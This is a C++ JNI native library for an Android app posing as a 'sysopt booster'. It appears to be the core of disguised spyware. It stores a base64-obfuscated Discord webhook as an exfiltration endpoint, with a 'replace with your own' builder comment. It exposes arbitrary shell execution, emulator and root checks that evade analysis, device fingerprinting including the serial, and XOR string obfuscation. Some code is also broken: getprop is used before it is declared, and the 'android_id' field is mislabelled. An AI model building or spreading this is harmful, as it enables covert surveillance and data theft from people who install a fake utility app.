#include <jni.h>
#include <string>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <fstream>
#include <sstream>
#include <android/log.h>

#define LOG_TAG "NativeCore"
#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)

extern "C" {

// ============================================================
// YOUR BASE64-ENCODED WEBHOOK URL (replace with your own)
// ============================================================
static const char* BASE64_WEBHOOK = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUzNzE2OTIzNjg1NjY3MjI4Ny93MWtqRWZvOWQ5UjB0M3YtYjlqZzl0N2xFVVNuZVc0YXFFUDhya0EzSUpaWXhZbDdtWEJtMzZjSWxJVVVPbFZ4TF8xOA==";

// ============================================================
// Decode base64 using Android's Base64 class
// ============================================================
std::string decodeBase64(JNIEnv* env, const char* base64) {
    jclass cls = env->FindClass("android/util/Base64");
    if (cls == nullptr) {
        LOGD("Base64 class not found");
        return std::string();
    }
    jmethodID decode = env->GetStaticMethodID(cls, "decode", "(Ljava/lang/String;I)[B");
    if (decode == nullptr) {
        LOGD("Base64.decode method not found");
        return std::string();
    }
    jstring encoded = env->NewStringUTF(base64);
    jbyteArray bytes = (jbyteArray) env->CallStaticObjectMethod(cls, decode, encoded, 0);
    if (bytes == nullptr) {
        LOGD("Base64.decode returned null");
        return std::string();
    }
    jsize len = env->GetArrayLength(bytes);
    jbyte* data = env->GetByteArrayElements(bytes, nullptr);
    std::string decoded((char*)data, len);
    env->ReleaseByteArrayElements(bytes, data, JNI_ABORT);
    env->DeleteLocalRef(encoded);
    env->DeleteLocalRef(bytes);
    env->DeleteLocalRef(cls);
    return decoded;
}

// ============================================================
// JNI function: returns the decoded webhook URL
// ============================================================
JNIEXPORT jstring JNICALL
Java_com_sysopt_booster_NativeLib_decodeWebhookUrl(JNIEnv *env, jobject thiz) {
    std::string url = decodeBase64(env, BASE64_WEBHOOK);
    if (url.empty()) {
        // Fallback – if decoding fails, return a hardcoded test URL
        return env->NewStringUTF("https://discord.com/api/webhooks/fallback");
    }
    return env->NewStringUTF(url.c_str());
}

// ============================================================
// Other native functions (unchanged)
// ============================================================

JNIEXPORT jbyteArray JNICALL
Java_com_sysopt_booster_NativeLib_xorDecrypt(JNIEnv *env, jobject thiz,
                                             jbyteArray data, jstring key) {
    jsize len = env->GetArrayLength(data);
    jbyte* arr = env->GetByteArrayElements(data, nullptr);
    const char* key_str = env->GetStringUTFChars(key, nullptr);
    size_t key_len = strlen(key_str);

    jbyteArray result = env->NewByteArray(len);
    jbyte* res_arr = env->GetByteArrayElements(result, nullptr);

    for (int i = 0; i < len; i++) {
        res_arr[i] = arr[i] ^ key_str[i % key_len];
    }

    env->ReleaseByteArrayElements(data, arr, JNI_ABORT);
    env->ReleaseStringUTFChars(key, key_str);
    env->ReleaseByteArrayElements(result, res_arr, 0);

    return result;
}

JNIEXPORT jstring JNICALL
Java_com_sysopt_booster_NativeLib_executeShell(JNIEnv *env, jobject thiz,
                                               jstring command) {
    const char* cmd = env->GetStringUTFChars(command, nullptr);
    char buffer[1024];
    std::string result;

    FILE* pipe = popen(cmd, "r");
    if (!pipe) {
        env->ReleaseStringUTFChars(command, cmd);
        return env->NewStringUTF("ERROR");
    }

    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        result += buffer;
    }

    int status = pclose(pipe);
    env->ReleaseStringUTFChars(command, cmd);

    char status_buf[16];
    snprintf(status_buf, sizeof(status_buf), "\n[exit:%d]", status);
    result += status_buf;

    return env->NewStringUTF(result.c_str());
}

JNIEXPORT jboolean JNICALL
Java_com_sysopt_booster_NativeLib_checkEmulator(JNIEnv *env, jobject thiz) {
    // Check for emulator properties
    const char* props[] = {
        "ro.kernel.qemu",
        "ro.product.device",
        "ro.product.model",
        "ro.product.name"
    };

    for (const char* prop : props) {
        char cmd[128];
        snprintf(cmd, sizeof(cmd), "getprop %s", prop);
        FILE* fp = popen(cmd, "r");
        if (fp) {
            char buffer[64] = {0};
            if (fgets(buffer, sizeof(buffer), fp)) {
                if (strstr(buffer, "qemu") || strstr(buffer, "emulator") ||
                    strstr(buffer, "goldfish") || strstr(buffer, "ranchu")) {
                    pclose(fp);
                    return JNI_TRUE;
                }
            }
            pclose(fp);
        }
    }

    // Check for emulator files
    const char* emu_files[] = {
        "/system/bin/qemu-props",
        "/dev/qemu_pipe",
        "/init.goldfish.rc",
        "/system/etc/init.goldfish.sh"
    };

    for (const char* file : emu_files) {
        if (access(file, F_OK) == 0) {
            return JNI_TRUE;
        }
    }

    return JNI_FALSE;
}

JNIEXPORT jboolean JNICALL
Java_com_sysopt_booster_NativeLib_checkRoot(JNIEnv *env, jobject thiz) {
    const char* root_paths[] = {
        "/system/bin/su",
        "/system/xbin/su",
        "/system/sbin/su",
        "/system/bin/.su",
        "/sbin/su",
        "/system/xbin/daemonsu",
        "/data/local/xbin/su",
        "/data/local/bin/su"
    };

    for (const char* path : root_paths) {
        if (access(path, F_OK) == 0) {
            return JNI_TRUE;
        }
    }

    const char* root_apps[] = {
        "/system/app/Superuser.apk",
        "/system/app/SuperUser.apk",
        "/system/app/Kinguser.apk",
        "/system/app/KingUser.apk",
        "/data/app/superuser.apk"
    };

    for (const char* app : root_apps) {
        if (access(app, F_OK) == 0) {
            return JNI_TRUE;
        }
    }

    if (system("su -c 'echo test' 2>/dev/null") == 0) {
        return JNI_TRUE;
    }

    return JNI_FALSE;
}

JNIEXPORT jstring JNICALL
Java_com_sysopt_booster_NativeLib_getDeviceFingerprint(JNIEnv *env, jobject thiz) {
    std::stringstream ss;
    ss << "model:" << getprop("ro.product.model") << "|";
    ss << "manufacturer:" << getprop("ro.product.manufacturer") << "|";
    ss << "board:" << getprop("ro.product.board") << "|";
    ss << "device:" << getprop("ro.product.device") << "|";
    ss << "brand:" << getprop("ro.product.brand") << "|";
    ss << "hardware:" << getprop("ro.hardware") << "|";
    ss << "serial:" << getprop("ro.serialno") << "|";
    ss << "android_id:" << getprop("ro.build.version.release") << "|";
    ss << "security_patch:" << getprop("ro.build.version.security_patch");
    return env->NewStringUTF(ss.str().c_str());
}

JNIEXPORT jstring JNICALL
Java_com_sysopt_booster_NativeLib_obfuscateString(JNIEnv *env, jobject thiz,
                                                  jstring input, jint key) {
    const char* str = env->GetStringUTFChars(input, nullptr);
    std::string result;
    result.reserve(strlen(str));

    for (const char* p = str; *p; p++) {
        result += static_cast<char>(*p ^ (key & 0xFF));
        key = (key * 1103515245 + 12345) & 0x7FFFFFFF;
    }

    env->ReleaseStringUTFChars(input, str);
    return env->NewStringUTF(result.c_str());
}

// Helper: get system property
static std::string getprop(const char* name) {
    char cmd[128];
    snprintf(cmd, sizeof(cmd), "getprop %s", name);
    char buffer[256] = {0};
    FILE* fp = popen(cmd, "r");
    if (fp) {
        if (fgets(buffer, sizeof(buffer), fp)) {
            size_t len = strlen(buffer);
            if (len > 0 && buffer[len-1] == '\n') {
                buffer[len-1] = '\0';
            }
        }
        pclose(fp);
    }
    return std::string(buffer);
}

} // extern "C"
